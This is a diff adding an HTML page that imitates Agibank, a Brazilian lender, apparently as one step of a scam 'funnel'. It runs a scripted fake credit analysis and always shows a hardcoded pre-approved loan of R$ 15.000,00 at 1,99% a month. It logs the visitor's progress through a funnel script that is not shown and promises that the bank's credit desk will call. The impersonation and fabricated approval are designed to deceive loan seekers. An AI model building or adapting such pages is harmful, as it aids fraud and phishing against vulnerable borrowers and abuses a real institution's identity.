@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Agibank - Analisando Ofertas</title>
+    <script src="assets/js/tailwind.js"></script>
+    <link href="assets/css/inter.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <script src="assets/js/funnel.js"></script>
+    <style>
+        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0064F5 0%, #003d99 100%); }
+        .progress-bar { transition: width 0.5s ease-in-out; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .animate-pulse-slow { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        .analise-card { backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.98); }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+    
+    <!-- Tela de Carregamento e Progresso -->
+    <div id="loading-screen" class="analise-card w-full max-w-md p-8 rounded-3xl shadow-2xl text-center">
+        <img src="assets/img/logo-agi.png" alt="Agibank" class="h-9 mx-auto mb-6 object-contain">
+        
+        <div class="mb-6 relative inline-block">
+            <div class="w-16 h-16 border-4 border-blue-100 border-t-[#0064F5] rounded-full animate-spin mx-auto"></div>
+        </div>
+        
+        <h1 class="text-2xl font-black text-slate-800 mb-1">Analisando propostas...</h1>
+        <p id="status-text" class="text-[#0064F5] font-semibold text-sm animate-pulse-slow mb-6">Iniciando consulta segura Agibank...</p>
+        
+        <div class="w-full bg-gray-100 h-2.5 rounded-full mb-6 overflow-hidden">
+            <div id="progress" class="progress-bar bg-[#0064F5] h-full w-0"></div>
+        </div>
+        
+        <div class="space-y-3.5 text-left text-xs">
+            <div id="step-1" class="flex items-center text-gray-400 transition-all duration-500">
+                <div class="w-5 h-5 rounded-full border-2 border-current flex items-center justify-center mr-3 font-bold">1</div>
+                <span class="font-medium">Validando dados cadastrais no convênio</span>
+            </div>
+            <div id="step-2" class="flex items-center text-gray-400 transition-all duration-500">
+                <div class="w-5 h-5 rounded-full border-2 border-current flex items-center justify-center mr-3 font-bold">2</div>
+                <span class="font-medium">Consultando margem consignável disponível</span>
+            </div>
+            <div id="step-3" class="flex items-center text-gray-400 transition-all duration-500">
+                <div class="w-5 h-5 rounded-full border-2 border-current flex items-center justify-center mr-3 font-bold">3</div>
+                <span class="font-medium">Aplicando taxa especial de 1,99%</span>
+            </div>
+            <div id="step-4" class="flex items-center text-gray-400 transition-all duration-500">
+                <div class="w-5 h-5 rounded-full border-2 border-current flex items-center justify-center mr-3 font-bold">4</div>
+                <span class="font-medium">Finalizando proposta pré-aprovada</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Tela de Resultado Oficial Agibank -->
+    <div id="result-screen" class="hidden analise-card w-full max-w-md rounded-3xl shadow-2xl overflow-hidden">
+        <div class="bg-[#0064F5] p-8 text-center text-white">
+            <img src="assets/img/logo-agi-white.png" alt="Agibank" class="h-8 mx-auto mb-4 object-contain">
+            <div class="inline-block bg-white/20 backdrop-blur text-xs font-bold px-4 py-1 rounded-full mb-3 uppercase tracking-wider">
+                Proposta Pré-Aprovada
+            </div>
+            <h2 class="text-sm font-medium opacity-90">Valor disponível para liberação:</h2>
+            <div class="text-4xl sm:text-5xl font-black mt-2 tracking-tight" id="valor-liberado">R$ 15.000,00</div>
+        </div>
+
+        <div class="p-6 md:p-8 space-y-6">
+            <div class="bg-blue-50 border border-blue-100 p-4 rounded-2xl">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-xs text-gray-600 font-medium">Prazo em:</span>
+                    <span class="font-bold text-gray-900 text-sm">84x de R$ 398,50</span>
+                </div>
+                <div class="flex justify-between items-center">
+                    <span class="text-xs text-gray-600 font-medium">Taxa de Juros:</span>
+                    <span class="font-bold text-[#0064F5] text-sm">1,99% ao mês</span>
+                </div>
+            </div>
+
+            <div class="space-y-3">
+                <button onclick="finalizarProposta()" class="w-full bg-[#10b981] hover:bg-[#059669] text-white font-bold py-4 rounded-2xl shadow-lg shadow-emerald-200 transition-all transform hover:-translate-y-1 flex items-center justify-center space-x-2 text-base">
+                    <span>LIBERAR DINHEIRO NA CONTA</span>
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+                </button>
+            </div>
+
+            <p class="text-center text-[11px] text-gray-400">
+                Agibank Financeira S.A. Crédito sujeito à aprovação cadastral e margem consignável.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const statusText = document.getElementById('status-text');
+        const progress = document.getElementById('progress');
+        const loadingScreen = document.getElementById('loading-screen');
+        const resultScreen = document.getElementById('result-screen');
+
+        const steps = [
+            { id: 'step-1', text: 'Validando dados cadastrais no convênio...', p: 25 },
+            { id: 'step-2', text: 'Consultando margem consignável disponível...', p: 50 },
+            { id: 'step-3', text: 'Aplicando taxa especial de 1,99%...', p: 75 },
+            { id: 'step-4', text: 'Calculando melhor oferta...', p: 100 }
+        ];
+
+        let currentStep = 0;
+
+        function runSteps() {
+            if (currentStep < steps.length) {
+                const s = steps[currentStep];
+                statusText.innerText = s.text;
+                progress.style.width = s.p + '%';
+                
+                const el = document.getElementById(s.id);
+                el.classList.remove('text-gray-400');
+                el.classList.add('text-[#0064F5]', 'font-bold');
+
+                currentStep++;
+                setTimeout(runSteps, 1200);
+            } else {
+                setTimeout(showResult, 800);
+            }
+        }
+
+        async function showResult() {
+            loadingScreen.classList.add('hidden');
+            resultScreen.classList.remove('hidden');
+
+            const valorLiberado = "R$ 15.000,00";
+            document.getElementById('valor-liberado').innerText = valorLiberado;
+
+            await saveFunnelData('analise', {
+                valor_liberado: valorLiberado,
+                parcelas: "84x",
+                valor_parcela: "R$ 398,50",
+                status: "aprovado"
+            });
+        }
+
+        function finalizarProposta() {
+            alert('Parabéns! Sua proposta foi encaminhada para a mesa de crédito do Agibank. Nossa equipe entrará em contato em instantes.');
+            window.location.href = 'index.html';
+        }
+
+        document.addEventListener('DOMContentLoaded', runSteps);
+    </script>
+</body>
+</html>
